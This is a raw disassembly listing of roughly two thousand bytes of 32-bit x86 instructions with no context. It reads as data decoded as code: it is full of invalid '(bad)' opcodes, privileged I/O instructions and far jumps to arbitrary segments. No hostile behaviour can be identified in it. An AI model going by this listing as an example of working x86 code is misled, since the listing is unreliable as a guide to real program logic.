  413fda:	xor    al,0xb7
  413fdc:	scas   eax,DWORD PTR es:[edi]
  413fdd:	jle    0x414046
  413fdf:	mov    dh,0xba
  413fe1:	das    
  413fe2:	push   ss
  413fe3:	lahf   
  413fe4:	mov    ebx,0xd36e80e5
  413fe9:	sub    BYTE PTR [eax+0x4e092fea],dl
  413fef:	xchg   DWORD PTR [ecx],eax
  413ff1:	pop    es
  413ff2:	xchg   edi,eax
  413ff3:	(bad)  
  413ff4:	ror    BYTE PTR [esi-0x73b8b2ec],cl
  413ffa:	iret   
  413ffb:	adc    al,0x34
  413ffd:	push   0xdda29667
  414002:	lahf   
  414003:	mov    ebp,0xc7bbe005
  414008:	pop    esp
  414009:	call   0x3f3ff614
  41400e:	jg     0x413fbb
  414010:	adc    eax,0xed031cdf
  414015:	lods   al,BYTE PTR ds:[esi]
  414016:	mov    ecx,0x96e27bba
  41401b:	pop    ds
  41401c:	arpl   WORD PTR [edi],bx
  41401e:	cli    
  41401f:	sti    
  414020:	mov    eax,0x9d2a1344
  414025:	hlt    
  414026:	jno    0x414021
  414028:	cs cmc 
  41402a:	sahf   
  41402b:	inc    esi
  41402c:	and    ebp,DWORD PTR [eax+0x543eb87e]
  414032:	rol    BYTE PTR [ebp+0x38bcd0a1],0x19
  414039:	in     al,dx
  41403a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41403b:	movlps QWORD PTR [ecx+ebx*8-0x53a71329],xmm0
  414043:	inc    esi
  414044:	jns    0x4140bc
  414046:	scas   al,BYTE PTR es:[edi]
  414047:	sub    bh,BYTE PTR [edi+0x3a]
  41404a:	aaa    
  41404b:	pop    esp
  41404c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41404d:	inc    ebx
  41404e:	pop    ebp
  41404f:	into   
  414050:	mov    ch,0x60
  414052:	xchg   ebp,eax
  414053:	cmp    bl,BYTE PTR [eax]
  414055:	cwde   
  414056:	inc    ebx
  414057:	imul   bp,WORD PTR [edi],0x36
  41405b:	stc    
  41405c:	push   eax
  41405d:	sbb    eax,0xedaf41dc
  414062:	outs   dx,DWORD PTR ds:[esi]
  414063:	and    esp,ebx
  414065:	ins    DWORD PTR es:[edi],dx
  414066:	sbb    ch,BYTE PTR [esi+edx*8]
  414069:	pop    ss
  41406a:	push   ds
  41406b:	jae    0x41403d
  41406d:	push   0x8ad603f1
  414072:	cmp    cl,BYTE PTR [esi]
  414074:	es popf 
  414076:	mov    WORD PTR [edi],gs
  414078:	jmp    0x4140f8
  41407a:	(bad)  
  41407b:	push   eax
  41407c:	mov    WORD PTR [ebx+0x6184ea52],ds
  414082:	and    eax,0xf7bc1221
  414087:	sub    BYTE PTR [eax+0x6b],ah
  41408a:	xor    BYTE PTR [eax-0x7f473aed],cl
  414090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414091:	cld    
  414092:	add    bh,BYTE PTR [esi-0x3d640711]
  414098:	cmc    
  414099:	adc    DWORD PTR [ebp-0x29],eax
  41409c:	mov    ds:0x39234ad9,al
  4140a1:	mov    esi,0xb01bea27
  4140a6:	fadd   DWORD PTR [eax+edx*1-0x317a0779]
  4140ad:	cwde   
  4140ae:	xchg   ebx,eax
  4140af:	fmul   QWORD PTR [esi+edx*1]
  4140b2:	fnstsw WORD PTR [ebx]
  4140b4:	(bad)  
  4140b5:	cld    
  4140b6:	mov    ds:0x77ca3476,al
  4140bb:	sbb    eax,0x3d055ca0
  4140c0:	fnstcw WORD PTR [esi]
  4140c2:	dec    edx
  4140c3:	sub    ah,al
  4140c5:	lea    esi,[esi-0x7c]
  4140c8:	call   0xfd9d3060
  4140cd:	(bad)  
  4140ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140cf:	(bad)  
  4140d0:	aas    
  4140d1:	leave  
  4140d2:	fwait
  4140d3:	mov    esp,0x3117a843
  4140d8:	pushf  
  4140d9:	stos   DWORD PTR es:[edi],eax
  4140da:	jmp    0x47c2:0x90c2fc72
  4140e1:	jecxz  0x4140fa
  4140e3:	xchg   esp,eax
  4140e4:	add    DWORD PTR [eax-0x5e],esi
  4140e7:	or     eax,0x4450f2e1
  4140ec:	cld    
  4140ed:	in     al,dx
  4140ee:	fisubr DWORD PTR [ecx+ebp*4-0x7c904c0d]
  4140f5:	outs   dx,DWORD PTR ds:[esi]
  4140f6:	add    al,0xa3
  4140f8:	add    dl,BYTE PTR [ecx]
  4140fa:	test   BYTE PTR [esi],dh
  4140fc:	cdq    
  4140fd:	iret   
  4140fe:	cdq    
  4140ff:	call   0x5733:0x92b64fa8
  414106:	add    dh,BYTE PTR [edi]
  414108:	adc    bh,BYTE PTR [esp+esi*8]
  41410b:	jne    0x414112
  41410d:	rcr    BYTE PTR [edx],1
  41410f:	xchg   ebx,eax
  414110:	sub    dl,dh
  414112:	dec    eax
  414113:	and    BYTE PTR [edi-0x89bf5c5],dl
  414119:	out    0xb0,eax
  41411b:	cli    
  41411c:	ror    BYTE PTR [esi+0x4b75df4d],0x5c
  414123:	in     eax,0xce
  414125:	and    al,0x13
  414127:	lahf   
  414128:	inc    edi
  414129:	push   ds
  41412a:	pushf  
  41412b:	jl     0x414135
  41412d:	jne    0x41416c
  41412f:	ror    BYTE PTR [ecx-0x34],0x0
  414133:	sub    ebp,DWORD PTR [edi-0x42bb0c84]
  414139:	fcmovnb st,st(0)
  41413b:	lods   al,BYTE PTR ds:[esi]
  41413c:	fdivp  st(5),st
  41413e:	imul   eax,edi,0xcef08ef4
  414144:	into   
  414145:	pop    es
  414146:	push   esp
  414147:	nop
  414148:	adc    edx,DWORD PTR [edi]
  41414a:	adc    ah,ch
  41414c:	pop    ebp
  41414d:	sahf   
  41414e:	xlat   BYTE PTR ds:[ebx]
  41414f:	adc    eax,DWORD PTR [ebx+0x29]
  414152:	test   DWORD PTR [eax+0x3d],esi
  414155:	xor    al,0xe8
  414157:	mov    esi,0xacba4011
  41415c:	mov    bh,0xbf
  41415e:	or     BYTE PTR [ebp-0x318ac66],0xe0
  414165:	xor    DWORD PTR [ebx],edi
  414167:	add    DWORD PTR [ebx],ebp
  414169:	or     DWORD PTR [ecx-0x62],0x5c
  41416d:	hlt    
  41416e:	out    dx,al
  41416f:	mov    cl,0xbc
  414171:	pop    ecx
  414172:	pop    edx
  414173:	xchg   esp,eax
  414174:	gs popa 
  414176:	xlat   BYTE PTR ds:[ebx]
  414177:	fwait
  414178:	mov    edi,0xa6b5fb47
  41417d:	mov    ah,0x4a
  41417f:	(bad)  
  414180:	mov    es,WORD PTR [ebp+0x330a22dd]
  414186:	inc    eax
  414187:	mul    ah
  414189:	bound  edx,QWORD PTR [esi-0x32cde440]
  41418f:	add    BYTE PTR [eax+0x561d722],bh
  414195:	ret    
  414196:	mov    ds:0x43a77c42,al
  41419b:	mov    dl,BYTE PTR [edx]
  41419d:	jmp    0x86c7:0x43f954e3
  4141a4:	xchg   esi,eax
  4141a5:	int3   
  4141a6:	pop    eax
  4141a7:	sbb    BYTE PTR [ecx+edi*4],ah
  4141aa:	call   0x68b2:0x159cc3c6
  4141b1:	xchg   ecx,eax
  4141b2:	repz jnp 0x4141d6
  4141b5:	hlt    
  4141b6:	scas   al,BYTE PTR es:[edi]
  4141b7:	int    0xd9
  4141b9:	mov    ebx,0xe8e6c177
  4141be:	sub    edi,DWORD PTR [edx+0x1ebd8bd6]
  4141c4:	jecxz  0x4141fc
  4141c6:	aam    0x13
  4141c8:	out    0x7d,eax
  4141ca:	sbb    DWORD PTR [eax],ebp
  4141cc:	jae    0x414238
  4141ce:	inc    ecx
  4141cf:	sub    BYTE PTR [ebx+0x50],dl
  4141d2:	cmp    DWORD PTR [esi],ebp
  4141d4:	and    al,0x71
  4141d6:	mov    edi,0x331625c7
  4141db:	cdq    
  4141dc:	pushf  
  4141dd:	sbb    eax,0xb3f504c8
  4141e2:	mov    bl,0x99
  4141e4:	cmp    al,0xcc
  4141e6:	aas    
  4141e7:	gs cmp bl,0x7f
  4141eb:	cmp    DWORD PTR [edx+ecx*8+0x3a],eax
  4141ef:	jbe    0x4141be
  4141f1:	jb     0x4141c6
  4141f3:	in     eax,dx
  4141f4:	loope  0x414263
  4141f6:	or     BYTE PTR [ebp-0x25],al
  4141f9:	dec    ebp
  4141fa:	out    0x7b,al
  4141fc:	daa    
  4141fd:	and    eax,0xe9dc1675
  414202:	dec    edx
  414203:	adc    ecx,DWORD PTR [ebx-0x745170d2]
  414209:	mov    ebp,0xab674820
  41420e:	cld    
  41420f:	xor    al,0xc7
  414211:	in     eax,0xee
  414213:	mov    ch,0x73
  414215:	mov    eax,0xbcd38ab
  41421a:	sbb    eax,0x23dbd84d
  41421f:	mov    DWORD PTR [edx-0x4dfdafc8],0x51bca854
  414229:	xor    eax,0x9398bc34
  41422e:	sbb    DWORD PTR [ebp-0x1],ebp
  414231:	add    eax,DWORD PTR [eax+0x42a5cae1]
  414237:	adc    BYTE PTR [edx-0x65],ch
  41423a:	fild   DWORD PTR [ecx-0x31]
  41423d:	jnp    0x41420b
  41423f:	nop
  414240:	cld    
  414241:	inc    esi
  414242:	jmp    0x4d22:0x7b24a1b
  414249:	fst    st(7)
  41424b:	fcomp  QWORD PTR [edi+0x7a4227e1]
  414251:	jp     0x41420c
  414253:	fldcw  WORD PTR [eax]
  414255:	outs   dx,BYTE PTR ds:[esi]
  414256:	jmp    0x5b03:0x29e94c32
  41425d:	lahf   
  41425e:	jmp    0xb85a:0xaff82ff2
  414265:	mov    al,0xf1
  414267:	out    0x87,al
  414269:	cmp    al,0x73
  41426b:	(bad)  
  41426c:	test   cl,ah
  41426e:	stos   BYTE PTR es:[edi],al
  41426f:	mov    ebp,0x313028f0
  414274:	jb     0x4142a1
  414276:	jo     0x41420f
  414278:	sbb    dh,dh
  41427a:	sbb    bl,ch
  41427c:	mov    ch,0x6c
  41427e:	cmp    al,0x2b
  414280:	mov    eax,ds:0x76f32b39
  414285:	pop    esi
  414286:	jnp    0x414255
  414288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41428a:	push   ds
  41428b:	sar    bh,cl
  41428d:	(bad)  
  41428e:	cmc    
  41428f:	adc    esp,esi
  414291:	sub    eax,0xb45ef5cf
  414296:	test   BYTE PTR [eax+0x15f29f45],bl
  41429c:	cdq    
  41429d:	push   edx
  41429e:	xor    DWORD PTR [ebx],esp
  4142a0:	and    eax,0x395d8ac2
  4142a5:	out    dx,al
  4142a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a8:	(bad)  
  4142a9:	dec    eax
  4142aa:	addr16 and al,0x29
  4142ad:	sar    ecx,0x70
  4142b0:	arpl   WORD PTR [ebx+0xa],si
  4142b3:	push   cs
  4142b4:	xchg   ebx,eax
  4142b5:	xchg   esp,eax
  4142b6:	and    BYTE PTR [ecx+0x5a],dh
  4142b9:	or     BYTE PTR [eax],0x9d
  4142bc:	cmc    
  4142bd:	xor    DWORD PTR [edi],esp
  4142bf:	jecxz  0x4142ff
  4142c1:	adc    ecx,eax
  4142c3:	xor    cl,al
  4142c5:	push   ss
  4142c6:	xor    al,0xcb
  4142c8:	xchg   ebx,eax
  4142c9:	xor    edx,ebp
  4142cb:	je     0x4142b4
  4142cd:	mov    al,0x4
  4142cf:	push   0xc6d26722
  4142d4:	je     0x414266
  4142d6:	test   BYTE PTR [esi],ah
  4142d8:	(bad)  
  4142d9:	dec    edi
  4142da:	add    BYTE PTR [ecx-0x2c],bh
  4142dd:	test   DWORD PTR [ebx+esi*1],0x69b497a9
  4142e4:	inc    ebx
  4142e5:	nop
  4142e6:	ja     0x41427d
  4142e8:	mov    esi,0xeeeb5ec4
  4142ed:	stos   DWORD PTR es:[edi],eax
  4142ee:	inc    esi
  4142ef:	pop    eax
  4142f0:	sbb    DWORD PTR [ebx+0x28],eax
  4142f3:	dec    esp
  4142f4:	jge    0x414277
  4142f6:	jmp    0x8020:0x518b119
  4142fd:	and    DWORD PTR [edi-0x60e625b1],edx
  414303:	test   esp,eax
  414305:	dec    ebp
  414306:	ins    DWORD PTR es:[edi],dx
  414307:	inc    edx
  414308:	sub    DWORD PTR [esi],esp
  41430a:	retf   0xe25e
  41430d:	mov    al,ds:0xefd8c369
  414312:	jnp    0x4142c4
  414314:	jmp    0xdc54eeaf
  414319:	jbe    0x4142d1
  41431b:	daa    
  41431c:	add    BYTE PTR [edi],ah
  41431e:	(bad)  
  41431f:	mov    al,ds:0x409936d8
  414324:	out    dx,eax
  414325:	dec    eax
  414326:	popf   
  414327:	pmaxub mm6,mm5
  41432a:	mov    esp,0x6b32b811
  41432f:	pop    ecx
  414330:	(bad)  
  414331:	lock mov WORD PTR [ebp+eax*8-0x2c4c1ea8],?
  414339:	neg    DWORD PTR [edx-0x58]
  41433c:	loop   0x414363
  41433e:	pop    esp
  41433f:	xchg   edi,eax
  414340:	popf   
  414341:	xchg   DWORD PTR [ebp+edi*8+0x15],eax
  414345:	or     BYTE PTR [edi+0x5e],ch
  414348:	mov    BYTE PTR [ecx+0x2c],al
  41434b:	(bad)  [ebp-0x4f650263]
  414351:	leave  
  414352:	xor    BYTE PTR [eax],bh
  414354:	loope  0x4143bd
  414356:	ds sbb bh,0x87
  41435a:	lock scas al,BYTE PTR es:[edi]
  41435c:	sub    eax,DWORD PTR [edx+0x57]
  41435f:	push   ds
  414360:	lahf   
  414361:	and    eax,0x645f3ea4
  414366:	cmp    cl,0xfe
  414369:	xchg   edx,eax
  41436a:	ror    DWORD PTR [edx-0x25],1
  41436d:	jl     0x4143c9
  41436f:	mov    bh,0x4b
  414371:	xchg   esi,eax
  414372:	inc    esi
  414373:	nop
  414374:	pop    ebp
  414375:	loop   0x41438c
  414377:	aam    0xb1
  414379:	out    0x1,al
  41437b:	xlat   BYTE PTR cs:[ebx]
  41437d:	xor    dh,BYTE PTR [ecx-0x6b]
  414380:	pop    edx
  414381:	cdq    
  414382:	jl     0x4143de
  414384:	xchg   dh,bl
  414386:	mov    eax,ds:0x5d9ddd5e
  41438b:	xchg   ebp,eax
  41438c:	pop    ss
  41438d:	dec    edi
  41438e:	adc    al,0x45
  414390:	mov    ebx,DWORD PTR [ecx]
  414392:	cmc    
  414393:	jo     0x41434d
  414395:	jbe    0x4143f6
  414397:	mov    eax,ds:0xc33ba778
  41439c:	push   edi
  41439d:	push   es
  41439e:	or     bl,dh
  4143a0:	fxch   st(0)
  4143a2:	or     eax,0xd82f9ded
  4143a7:	cmp    BYTE PTR [ecx],ah
  4143a9:	icebp  
  4143aa:	cmc    
  4143ab:	and    al,0xad
  4143ad:	mov    edi,0x238095d5
  4143b2:	rcr    DWORD PTR [eax-0x212bb9db],0x1f
  4143b9:	inc    esp
  4143ba:	jno    0x4143d6
  4143bc:	imul   ebp,ebx,0x80edf856
  4143c2:	fisttp DWORD PTR [ebx-0x4d0fdcfc]
  4143c8:	scas   al,BYTE PTR es:[edi]
  4143c9:	fwait
  4143ca:	cli    
  4143cb:	outs   dx,DWORD PTR ds:[esi]
  4143cc:	das    
  4143cd:	in     al,dx
  4143ce:	arpl   WORD PTR [edi+0x5f],cx
  4143d1:	xchg   esp,eax
  4143d2:	imul   edx,esi,0xffffff9e
  4143d5:	stc    
  4143d6:	fs (bad) 
  4143d9:	push   edx
  4143da:	jg     0x414438
  4143dc:	shl    ebx,cl
  4143de:	outs   dx,BYTE PTR ds:[esi]
  4143df:	dec    esp
  4143e0:	cmc    
  4143e1:	fdivr  st,st(5)
  4143e3:	xor    edx,edx
  4143e5:	bound  ebx,QWORD PTR [esp+eax*1]
  4143e8:	pop    es
  4143e9:	push   es
  4143ea:	jne    0x414428
  4143ec:	push   ebp
  4143ed:	dec    ecx
  4143ee:	add    eax,0xdca4f03a
  4143f3:	pop    ebx
  4143f4:	sub    DWORD PTR [esi-0x67adeb89],0x13
  4143fb:	loop   0x4143fc
  4143fd:	aam    0x7
  4143ff:	push   ecx
  414400:	or     BYTE PTR [eax+0x5009778e],0xbc
  414407:	push   0x76
  414409:	loope  0x414400
  41440b:	mov    ebp,0x37365cfe
  414410:	and    BYTE PTR [eax+ebp*4+0x24980be],dh
  414417:	test   BYTE PTR [edi],bh
  414419:	sbb    DWORD PTR [esi+ecx*8-0x16e5225f],edi
  414420:	scas   eax,DWORD PTR es:[edi]
  414421:	push   ds
  414422:	sub    ebp,edi
  414424:	fistp  WORD PTR [edi]
  414426:	fadd   st(7),st
  414428:	jbe    0x41449c
  41442a:	xchg   edx,eax
  41442b:	xor    esi,DWORD PTR [edi]
  41442d:	fisttp WORD PTR [ecx+0x5747778]
  414433:	jnp    0x4143bf
  414435:	lea    esi,[edi-0x28f341eb]
  41443b:	mov    ds:0x31c86618,eax
  414440:	or     al,0x75
  414442:	xchg   esp,eax
  414443:	dec    ebx
  414444:	addr16 or al,0xba
  414447:	out    dx,al
  414448:	scas   eax,DWORD PTR es:[edi]
  414449:	fs out 0x1f,eax
  41444c:	jge    0x41444a
  41444e:	cdq    
  41444f:	mov    bl,0x4a
  414451:	mov    bl,0xff
  414453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414454:	stos   BYTE PTR es:[edi],al
  414455:	jmp    0x5a6b96e5
  41445a:	jmp    FWORD PTR [edi]
  41445c:	pop    edx
  41445d:	lea    edi,[edx+0x54]
  414460:	xchg   ebx,eax
  414461:	push   esp
  414462:	mov    edi,0x4455b91c
  414467:	loop   0x41445b
  414469:	push   eax
  41446a:	or     BYTE PTR [eax],0x23
  41446d:	sbb    DWORD PTR [edx+eiz*2+0x4c0054ef],ebx
  414474:	into   
  414475:	add    al,0xdd
  414477:	outs   dx,BYTE PTR ds:[esi]
  414478:	lods   eax,DWORD PTR ds:[esi]
  414479:	mov    bh,BYTE PTR gs:[esi-0x55]
  41447d:	(bad)  
  41447e:	adc    al,0x55
  414480:	hlt    
  414481:	pop    ecx
  414482:	mov    ebx,0x875bbda6
  414487:	shl    dh,1
  414489:	mov    ecx,DWORD PTR fs:[ebx]
  41448c:	inc    eax
  41448d:	push   esp
  41448e:	xor    ebp,esp
  414490:	rol    BYTE PTR [ebx+0x47],0xac
  414494:	(bad)  
  414495:	mov    edx,0x4db4452f
  41449a:	mov    dl,0xb
  41449c:	cmp    al,0xc4
  41449e:	jae    0x4144de
  4144a0:	call   0x6a2cce58
  4144a5:	mov    ecx,0xfebfe3e2
  4144aa:	or     esp,DWORD PTR [ebp+0x31e9d831]
  4144b0:	pop    ds
  4144b1:	dec    esp
  4144b2:	cmp    eax,0x580447a4
  4144b7:	clc    
  4144b8:	int3   
  4144b9:	repz pop ss
  4144bb:	ss pushf 
  4144bd:	pushf  
  4144be:	gs xor ecx,edx
  4144c1:	dec    esp
  4144c2:	and    BYTE PTR [edi],bh
  4144c4:	xor    eax,0xa8b4c387
  4144c9:	inc    ebx
  4144ca:	jb     0x4144c3
  4144cc:	sbb    DWORD PTR [eax+ebp*1+0x36dbe840],ebp
  4144d3:	in     al,dx
  4144d4:	xor    ebp,DWORD PTR [esp+edx*4+0x7be231f5]
  4144db:	cmp    al,0x2f
  4144dd:	es dec sp
  4144e0:	push   0xfd24b7e8
  4144e5:	sub    BYTE PTR [esi-0x4c9f9a7f],bl
  4144eb:	fucomi st,st(7)
  4144ed:	addr16 xchg ecx,eax
  4144ef:	mov    ch,0x2a
  4144f1:	push   ecx
  4144f2:	test   al,0xc4
  4144f4:	inc    edi
  4144f5:	clc    
  4144f6:	mov    DWORD PTR [ecx+0x4],esi
  4144f9:	inc    eax
  4144fa:	lock scas eax,DWORD PTR es:[edi]
  4144fc:	test   eax,0x580302d6
  414501:	(bad)  
  414502:	cmc    
  414503:	mov    ecx,0xac636472
  414508:	fnsave [ecx+0x52]
  41450b:	lds    ebx,FWORD PTR [ebp-0x60]
  41450e:	fwait
  41450f:	mov    bh,0x2c
  414511:	inc    eax
  414512:	sub    DWORD PTR [edx],0xd28168cc
  414518:	jns    0x41451c
  41451a:	mov    ebp,0x75921c7e
  41451f:	jnp    0x414519
  414521:	sub    DWORD PTR [ecx],esi
  414523:	pop    edx
  414524:	jae    0x414595
  414526:	js     0x41458b
  414528:	push   esp
  414529:	mov    bh,BYTE PTR [ebp-0x59]
  41452c:	(bad)  
  41452d:	sub    al,0x7
  41452f:	stos   DWORD PTR es:[edi],eax
  414530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414531:	sub    cl,bh
  414533:	inc    ecx
  414534:	rol    BYTE PTR [edx+0x5f],cl
  414537:	jb     0x41455b
  414539:	jl     0x4144d6
  41453b:	sar    BYTE PTR [ebp-0x6b281f28],cl
  414541:	jae    0x414521
  414543:	push   ecx
  414544:	stos   DWORD PTR es:[edi],eax
  414545:	jmp    0x3aff:0xa4552615
  41454c:	mov    cs,WORD PTR [edx]
  41454e:	jecxz  0x414528
  414550:	sub    eax,ebp
  414552:	cwde   
  414553:	dec    eax
  414554:	fisubr DWORD PTR [edx-0x6a]
  414557:	cdq    
  414558:	mov    eax,ds:0x2bc41abb
  41455d:	mov    bh,0x95
  41455f:	fwait
  414560:	add    esi,ebx
  414562:	pop    esi
  414563:	sub    DWORD PTR [edx],esi
  414565:	repnz leave 
  414567:	push   0xa8ad5811
  41456c:	jnp    0x4144fd
  41456e:	lods   al,BYTE PTR ds:[esi]
  41456f:	mov    bh,0xb
  414571:	pop    esi
  414572:	into   
  414573:	cmp    BYTE PTR [ebp+0x5fb46dcd],ah
  414579:	jl     0x4145a0
  41457b:	cmp    DWORD PTR [ebp+0x788fc486],ebx
  414581:	loop   0x4145c3
  414583:	sub    ebx,DWORD PTR [esi-0x8badcef]
  414589:	xchg   ecx,eax
  41458a:	inc    eax
  41458b:	mov    dl,0x10
  41458d:	je     0x4145fb
  41458f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414590:	cmp    eax,0x64caa4fc
  414595:	ins    BYTE PTR es:[edi],dx
  414596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414597:	sbb    ebx,esi
  414599:	inc    ecx
  41459a:	(bad)  
  41459b:	int    0x7b
  41459d:	in     eax,0xf0
  41459f:	daa    
  4145a0:	or     bl,BYTE PTR [ebp+0x4c5d091a]
  4145a6:	xor    al,0x2b
  4145a8:	adc    eax,0x8ec8b06e
  4145ad:	fsub   DWORD PTR [edi]
  4145af:	outs   dx,DWORD PTR gs:[esi]
  4145b1:	jns    0x4145a9
  4145b3:	mov    ds:0x92dd25b2,al
  4145b8:	inc    ecx
  4145b9:	xchg   ebp,eax
  4145ba:	in     eax,dx
  4145bb:	xor    eax,DWORD PTR [edx]
  4145bd:	adc    eax,0xd1182175
  4145c2:	pop    esp
  4145c3:	mov    dh,0x5e
  4145c5:	(bad)  
  4145c6:	xchg   ebx,eax
  4145c7:	xchg   BYTE PTR ds:0xfd24fae5,al
  4145cd:	mov    ds:0xb72f83e4,al
  4145d2:	dec    eax
  4145d3:	inc    edi
  4145d4:	xchg   DWORD PTR [ecx-0x4d],esi
  4145d7:	das    
  4145d8:	mov    al,BYTE PTR [ebp-0x5459b10b]
  4145de:	ins    BYTE PTR es:[edi],dx
  4145df:	inc    ebx
  4145e0:	jecxz  0x414590
  4145e2:	call   0x61ff:0x7a62479a
  4145e9:	int    0x8b
  4145eb:	mov    BYTE PTR [ecx-0x56639df2],bh
  4145f1:	jnp    0x414636
  4145f3:	daa    
  4145f4:	adc    ebx,DWORD PTR [eax+ebp*2+0x2b]
  4145f8:	adc    al,0x6b
  4145fa:	and    edi,DWORD PTR [eax+0x36]
  4145fd:	jmp    DWORD PTR [esi]
  4145ff:	push   es
  414600:	inc    eax
  414601:	ins    BYTE PTR es:[edi],dx
  414602:	cmc    
  414603:	xor    al,0xf5
  414605:	pop    ds
  414606:	mov    ecx,DWORD PTR [edi-0x72243ec5]
  41460c:	mov    DWORD PTR [ebx-0x17],ebp
  41460f:	loope  0x4145ea
  414611:	pop    esp
  414612:	pop    ebp
  414613:	lahf   
  414614:	sti    
  414615:	or     eax,0x8010d236
  41461a:	mov    ah,0x0
  41461c:	sbb    al,0x86
  41461e:	in     al,0x9f
  414620:	mov    cl,0x65
  414622:	jns    0x414652
  414624:	(bad)  
  414625:	xor    BYTE PTR [ebp+0x50],al
  414628:	out    dx,eax
  414629:	dec    esi
  41462a:	jg     0x41469f
  41462c:	push   0xffffffd2
  41462e:	sbb    ebx,DWORD PTR [esi]
  414630:	fnsave [esi]
  414632:	sub    BYTE PTR [edx+0x4703bea],dl
  414638:	shl    BYTE PTR [eax-0x4b1ca51c],cl
  41463e:	dec    ebp
  41463f:	push   cs
  414640:	and    al,0xaf
  414642:	scas   eax,DWORD PTR es:[edi]
  414643:	sbb    bh,BYTE PTR [edi+0x7d66a18d]
  414649:	cld    
  41464a:	lock sub ecx,DWORD PTR [esi+0x2432b361]
  414651:	loop   0x4145ec
  414653:	imul   edi,DWORD PTR [ebp-0x77995b00],0x1211047e
  41465d:	fstp   TBYTE PTR [ebp+0x4281b2af]
  414663:	push   0x29
  414665:	and    DWORD PTR [edi],eax
  414667:	imul   esi,esp,0x46
  41466a:	inc    edx
  41466b:	pop    ebp
  41466c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41466d:	test   al,0xf9
  41466f:	jg     0x414690
  414671:	mov    al,0x87
  414673:	pop    edi
  414674:	aas    
  414675:	jo     0x414620
  414677:	idiv   BYTE PTR [ecx+ecx*2-0x41]
  41467b:	fcomp  DWORD PTR [ebp-0x57]
  41467e:	or     edi,DWORD PTR [edx+0x12]
  414681:	sahf   
  414682:	jp     0x414643
  414684:	stos   BYTE PTR es:[edi],al
  414685:	mov    bh,0x43
  414687:	outs   dx,DWORD PTR ds:[esi]
  414688:	mov    bh,0x76
  41468a:	inc    ebx
  41468b:	xor    al,0x37
  41468d:	jge    0x4146ed
  41468f:	int    0xcf
  414691:	pop    edi
  414692:	stos   BYTE PTR es:[edi],al
  414693:	les    edx,FWORD PTR [ebx]
  414695:	into   
  414696:	das    
  414697:	push   ds
  414698:	out    dx,eax
  414699:	mov    ch,0xa5
  41469b:	jns    0x4146ba
  41469d:	mov    cl,0x55
  41469f:	sub    BYTE PTR [ebp-0x3f],0xe8
  4146a3:	push   esp
  4146a4:	fbstp  TBYTE PTR [ecx]
  4146a6:	pop    esp
  4146a7:	pop    edi
  4146a8:	mov    esi,0xd1a2cd5e
  4146ad:	add    al,0xa5
  4146af:	bound  edi,QWORD PTR [edi]
  4146b1:	cmp    BYTE PTR [edx-0x76],al
  4146b4:	xchg   ecx,eax
  4146b5:	and    ah,BYTE PTR [ecx-0x24d37099]
  4146bb:	add    DWORD PTR [esi+0x5d],edi
  4146be:	jmp    0x129eb8f4
  4146c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146c4:	mov    gs,WORD PTR [edi]
  4146c6:	jl     0x414733
  4146c8:	ins    DWORD PTR es:[edi],dx
  4146c9:	fld    QWORD PTR [edx+0x25852983]
  4146cf:	das    
  4146d0:	jb     0x4146ef
  4146d2:	popa   
  4146d3:	cmc    
  4146d4:	call   0xb54054fc
  4146d9:	jmp    0xdd5475
  4146de:	aaa    
  4146df:	mov    BYTE PTR [esi+0x23],ah
  4146e2:	push   ebx
  4146e3:	sbb    BYTE PTR [ebp-0x292cab7f],cl
  4146e9:	add    BYTE PTR [edx+0x7c],0x53
  4146ed:	in     al,dx
  4146ee:	jmp    0x7d12:0x7e07d73b
  4146f5:	mov    ebx,0x89cceaa7
  4146fa:	or     eax,0x7cea6df8
  4146ff:	lods   eax,DWORD PTR ds:[esi]
  414700:	add    bl,bl
  414702:	add    BYTE PTR [ebx-0x41e48d19],bh
  414708:	shl    DWORD PTR [ecx],cl
  41470a:	repnz mov ebp,0x5702b375
  414710:	rcl    BYTE PTR [ebp+0x1e6ca55],0xb3
  414717:	std    
  414718:	(bad)  
  414719:	and    ch,al
  41471b:	sub    al,BYTE PTR [edx]
  41471d:	or     al,0xf0
  41471f:	xchg   edi,edx
  414721:	pusha  
  414722:	jmp    0x4146d2
  414724:	xor    BYTE PTR [ecx-0x23bd4ae5],bl
  41472a:	aad    0x0
  41472c:	xor    dh,al
  41472e:	add    al,0x4e
  414730:	cdq    
  414731:	iret   
  414732:	pop    ds
  414733:	pushf  
  414734:	sub    eax,0x13a4e333
  414739:	neg    DWORD PTR [edx-0x7f0e6772]
  41473f:	add    cl,BYTE PTR [esi-0x212cf809]
  414745:	push   cs
  414746:	adc    edi,DWORD PTR [ebx]
  414748:	mov    eax,ds:0x4b007f36
  41474d:	jmp    0x98cd:0xcbb3e2
  414754:	push   ecx
  414755:	jno    0x4146f1
  414757:	pop    edi
  414758:	xor    ah,BYTE PTR [ecx-0x61]
  41475b:	cs jp  0x41477a
  41475e:	das    
  41475f:	sbb    al,0x15
  414761:	test   DWORD PTR [ebp+0x2e],ebp
  414764:	popf   
  414765:	aas    
  414766:	jmp    0x4147d0
  414768:	push   edx
  414769:	jle    0x41473d
  41476b:	ret    
  41476c:	push   es
  41476d:	dec    edi
  41476e:	jb     0x41471d
  414770:	jg     0x414748
  414772:	mov    dl,0x47
  414774:	jb     0x4146fb
  414776:	or     ebx,eax
  414778:	mov    cl,0x8e
  41477a:	jb     0x4147ef
  41477c:	in     eax,dx
  41477d:	pop    ss
  41477e:	jge    0x41470d
  414780:	push   0x58224108
  414785:	in     eax,dx
  414786:	or     BYTE PTR ss:[edi],dh
  414789:	ror    DWORD PTR [ecx-0x76b32a9d],cl
  41478f:	scas   eax,DWORD PTR es:[edi]
  414790:	add    bh,BYTE PTR [eax+0x25]
  414793:	rep ins DWORD PTR es:[edi],dx
  414795:	push   ebx
  414796:	dec    eax
